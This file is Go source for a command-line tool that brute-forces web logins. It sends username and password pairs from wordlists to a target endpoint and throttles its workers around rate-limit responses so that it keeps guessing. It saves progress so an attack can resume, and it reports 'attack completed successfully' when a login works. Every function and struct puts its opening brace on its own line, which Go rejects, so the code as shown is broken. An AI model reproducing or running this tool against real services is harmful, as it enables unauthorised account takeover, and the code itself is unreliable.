package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// usage: use {{USERNAME}} and {{PASSWORD}} as placeholders in the form template
// example: -form '{"username":"{{USERNAME}}","password":"{{PASSWORD}}"}'

type Config struct 
{
	Username     string
	UserPath     string
	PassPath     string
	Target       string
	FormTemplate string
	Continue     bool
}

type ProgressState struct 
{
	Hash          string    `json:"hash"`
	UserIndex     int       `json:"user_index"`
	PassIndex     int       `json:"pass_index"`
	AttemptsCount int64     `json:"attempts_count"`
	Timestamp     time.Time `json:"timestamp"`
}

type ProgressStore struct 
{
	States []ProgressState `json:"states"`
}

const progressFile = ".gbrd"

type RateLimiter struct 
{
	workers     int32
	maxWorkers  int32
	minWorkers  int32
	rateLimited int32
	mu          sync.Mutex
}

func NewRateLimiter(initial, max, min int) *RateLimiter 
{
	return &RateLimiter{
		workers:    int32(initial),
		maxWorkers: int32(max),
		minWorkers: int32(min),
	}
}

func (rl *RateLimiter) GetWorkers() int 
{
	return int(atomic.LoadInt32(&rl.workers))
}

func (rl *RateLimiter) IncreaseRate() 
{
	rl.mu.Lock()
	defer rl.mu.Unlock()
	if rl.workers < rl.maxWorkers {
		rl.workers++
	}
}

func (rl *RateLimiter) DecreaseRate() 
{
	rl.mu.Lock()
	defer rl.mu.Unlock()
	if rl.workers > rl.minWorkers {
		rl.workers--
	}
}

func (rl *RateLimiter) RecordRateLimit() 
{
	atomic.StoreInt32(&rl.rateLimited, 1)
}

func (rl *RateLimiter) CheckAndClearRateLimit() bool 
{
	return atomic.SwapInt32(&rl.rateLimited, 0) == 1
}

func readLines(path string) ([]string, error) 
{
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func buildPayload(template, username, password string) string 
{
	payload := template
	payload = strings.ReplaceAll(payload, "{{USERNAME}}", username)
	payload = strings.ReplaceAll(payload, "{{PASSWORD}}", password)
	return payload
}

type Attempt struct 
{
	Username string
	Password string
}

func tryLogin(client *http.Client, target, formTemplate string, attempt Attempt) (int, string, error) 
{
	payload := buildPayload(formTemplate, attempt.Username, attempt.Password)
	req, err := http.NewRequest("POST", target, bytes.NewBufferString(payload))
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body), nil
}

func computeConfigHash(target, userPath, passPath string, userCount, passCount int) string 
{
	data := fmt.Sprintf("%s|%s|%s|%d|%d", target, userPath, passPath, userCount, passCount)
	hash := sha256.Sum256([]byte(data))
	return hex.EncodeToString(hash[:])
}

func loadProgressStore() (*ProgressStore, error) 
{
	data, err := os.ReadFile(progressFile)
	if err != nil {
		if os.IsNotExist(err) {
			return &ProgressStore{States: []ProgressState{}}, nil
		}
		return nil, err
	}
	var store ProgressStore
	if err := json.Unmarshal(data, &store); err != nil {
		return nil, err
	}
	return &store, nil
}

func saveProgressStore(store *ProgressStore) error 
{
	data, err := json.MarshalIndent(store, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(progressFile, data, 0644)
}

func findProgress(store *ProgressStore, hash string) *ProgressState 
{
	for i := range store.States {
		if store.States[i].Hash == hash {
			return &store.States[i]
		}
	}
	return nil
}

func updateProgress(store *ProgressStore, state ProgressState) 
{
	for i := range store.States {
		if store.States[i].Hash == state.Hash {
			store.States[i] = state
			return
		}
	}
	store.States = append(store.States, state)
}

func removeProgress(store *ProgressStore, hash string) 
{
	for i := range store.States {
		if store.States[i].Hash == hash {
			store.States = append(store.States[:i], store.States[i+1:]...)
			return
		}
	}
}

func promptYesNo(prompt string) bool 
{
	fmt.Printf("%s (y/n): ", prompt)
	var response string
	fmt.Scanln(&response)
	response = strings.ToLower(strings.TrimSpace(response))
	return response == "y" || response == "yes"
}

func worker(_ int, client *http.Client, target, formTemplate string, attempts <-chan Attempt,
	results chan<- string, wg *sync.WaitGroup, rateLimiter *RateLimiter, successFound *atomic.Bool,
	attemptCounter *atomic.Int64, latestStatus *atomic.Int32, timeoutCounter *atomic.Int64) 
	{
	defer wg.Done()

	for attempt := range attempts {
		if successFound.Load() {
			return
		}
		statusCode, body, err := tryLogin(client, target, formTemplate, attempt)

		if err != nil {
			// network error (including timeout) -> slow down
			timeoutCounter.Add(1)
			rateLimiter.DecreaseRate()
			time.Sleep(100 * time.Millisecond)
			continue
		}
		if statusCode == 429 || statusCode == 503 {
			rateLimiter.RecordRateLimit()
			rateLimiter.DecreaseRate()
			time.Sleep(500 * time.Millisecond)
			continue
		}
		attemptCounter.Add(1)
		latestStatus.Store(int32(statusCode))

		if statusCode >= 200 && statusCode < 300 {
			result := fmt.Sprintf("\n[+] username: '%s' >> password: '%s' >> status: %d\n%s\n",
				attempt.Username, attempt.Password, statusCode, body)
			results <- result
			successFound.Store(true)
			return
		}
	}
}

func main() {
	var config Config
	flag.StringVar(&config.Username, "username", "", "single username to test")
	flag.StringVar(&config.UserPath, "userpath", "", "path to username list file")
	flag.StringVar(&config.PassPath, "passpath", "", "path to password list file (required)")
	flag.StringVar(&config.Target, "target", "", "target endpoint url (required)")
	flag.StringVar(&config.FormTemplate, "form", "", "form template with {{USERNAME}} and {{PASSWORD}} placeholders (required)")
	flag.BoolVar(&config.Continue, "continue", false, "continue from last saved progress")
	flag.Parse()

	if config.Target == "" || config.FormTemplate == "" || config.PassPath == "" {
		fmt.Println("[!] error: -target, -form, and -passpath are required")
		flag.Usage()
		os.Exit(1)
	}

	passwords, err := readLines(config.PassPath)
	if err != nil {
		fmt.Printf("[!] error reading password file: %v\n", err)
		os.Exit(1)
	}

	var usernames []string
	if config.UserPath != "" {
		usernames, err = readLines(config.UserPath)
		if err != nil {
			fmt.Printf("[!] error reading username file: %v\n", err)
			os.Exit(1)
		}
	} else if config.Username != "" {
		usernames = []string{config.Username}
	} else {
		usernames = []string{""}
	}

	fmt.Printf("[*] loaded %d passwords\n", len(passwords))
	if len(usernames) > 0 && usernames[0] != "" {
		fmt.Printf("[*] loaded %d usernames\n", len(usernames))
	}
	fmt.Printf("[*] target: %s\n", config.Target)

	totalAttempts := len(passwords) * len(usernames)

	store, err := loadProgressStore()
	if err != nil {
		fmt.Printf("[!] warning: could not load progress store: %v\n", err)
		store = &ProgressStore{States: []ProgressState{}}
	}

	configHash := computeConfigHash(config.Target, config.UserPath, config.PassPath, len(usernames), len(passwords))

	var startUserIdx, startPassIdx int
	var resumeCount int64
	existingProgress := findProgress(store, configHash)

	if existingProgress != nil {
		shouldContinue := config.Continue
		if !shouldContinue {
			fmt.Printf("\n[*] found previous progress from %s (%d attempts completed)\n",
				existingProgress.Timestamp.Format("2006-01-02 15:04:05"),
				existingProgress.AttemptsCount)
			shouldContinue = promptYesNo("[?] do you want to continue from where you left off?")
		} else {
			fmt.Printf("[*] continuing from previous progress (%d attempts completed)\n",
				existingProgress.AttemptsCount)
		}

		if shouldContinue {
			startUserIdx = existingProgress.UserIndex
			startPassIdx = existingProgress.PassIndex
			resumeCount = existingProgress.AttemptsCount
			fmt.Printf("[*] resuming from user index %d, password index %d\n", startUserIdx, startPassIdx)
		} else {
			removeProgress(store, configHash)
			saveProgressStore(store)
		}
	}
	rateLimiter := NewRateLimiter(5, 10, 1)

	attempts := make(chan Attempt, 100)
	results := make(chan string, 10)

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	var wg sync.WaitGroup
	var successFound atomic.Bool
	var attemptCounter atomic.Int64
	var latestStatus atomic.Int32
	var attemptsComplete atomic.Bool
	var timeoutCounter atomic.Int64
	var currentUserIdx atomic.Int32
	var currentPassIdx atomic.Int32

	attemptCounter.Store(resumeCount)

	for i := 0; i < rateLimiter.GetWorkers(); i++ {
		wg.Add(1)
		go worker(i, client, config.Target, config.FormTemplate, attempts, results, &wg, rateLimiter,
			&successFound, &attemptCounter, &latestStatus, &timeoutCounter)
	}
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n[!] interrupt received, saving progress...")
		currentState := ProgressState{
			Hash:          configHash,
			UserIndex:     int(currentUserIdx.Load()),
			PassIndex:     int(currentPassIdx.Load()),
			AttemptsCount: attemptCounter.Load(),
			Timestamp:     time.Now(),
		}
		updateProgress(store, currentState)
		if err := saveProgressStore(store); err != nil {
			fmt.Printf("[!] error saving progress: %v\n", err)
		} else {
			fmt.Printf("[*] progress saved to %s\n", progressFile)
		}
		os.Exit(0)
	}()
	go func() {
		for result := range results {
			fmt.Print(result)
		}
	}()

	go func() {
		ticker := time.NewTicker(100 * time.Millisecond)
		defer ticker.Stop()

		for range ticker.C {
			if successFound.Load() {
				return
			}
			current := attemptCounter.Load()
			workers := rateLimiter.GetWorkers()
			status := latestStatus.Load()
			timeouts := timeoutCounter.Load()

			var statusLine string
			if status > 0 {
				statusLine = fmt.Sprintf("\r[*] attempt %d/%d (%d workers) [status: %d]", current, totalAttempts, workers, status)
			} else {
				statusLine = fmt.Sprintf("\r[*] attempt %d/%d (%d workers)", current, totalAttempts, workers)
			}

			if timeouts > 0 {
				statusLine += fmt.Sprintf(" [timeouts: %d]", timeouts)
			}

			fmt.Print(statusLine)
		}
	}()

	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()

		for range ticker.C {
			if successFound.Load() || attemptsComplete.Load() {
				return
			}

			if rateLimiter.CheckAndClearRateLimit() {
				continue
			}
			currentWorkers := rateLimiter.GetWorkers()
			if currentWorkers < int(rateLimiter.maxWorkers) {
				rateLimiter.IncreaseRate()
				wg.Add(1)
				go worker(currentWorkers, client, config.Target, config.FormTemplate, attempts,
					results, &wg, rateLimiter, &successFound, &attemptCounter, &latestStatus, &timeoutCounter)
			}
		}
	}()

	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()

		for range ticker.C {
			if successFound.Load() || attemptsComplete.Load() {
				return
			}

			currentState := ProgressState{
				Hash:          configHash,
				UserIndex:     int(currentUserIdx.Load()),
				PassIndex:     int(currentPassIdx.Load()),
				AttemptsCount: attemptCounter.Load(),
				Timestamp:     time.Now(),
			}
			updateProgress(store, currentState)
			if err := saveProgressStore(store); err != nil {
				fmt.Printf("\n[!] warning: could not save progress: %v\n", err)
			}
		}
	}()

	go func() {
		for userIdx, username := range usernames {
			for passIdx, password := range passwords {
				if userIdx < startUserIdx || (userIdx == startUserIdx && passIdx < startPassIdx) {
					continue
				}

				if successFound.Load() {
					break
				}
				currentUserIdx.Store(int32(userIdx))
				currentPassIdx.Store(int32(passIdx))

				attempts <- Attempt{
					Username: username,
					Password: password,
				}
			}
			if successFound.Load() {
				break
			}
		}
		close(attempts)
		attemptsComplete.Store(true)
	}()

	wg.Wait()
	close(results)

	removeProgress(store, configHash)
	if err := saveProgressStore(store); err != nil {
		fmt.Printf("[!] warning: could not clean up progress: %v\n", err)
	}

	if !successFound.Load() {
		fmt.Println("\n[!] no successful login found")
	} else {
		fmt.Println("\n[+] attack completed successfully")
	}
}
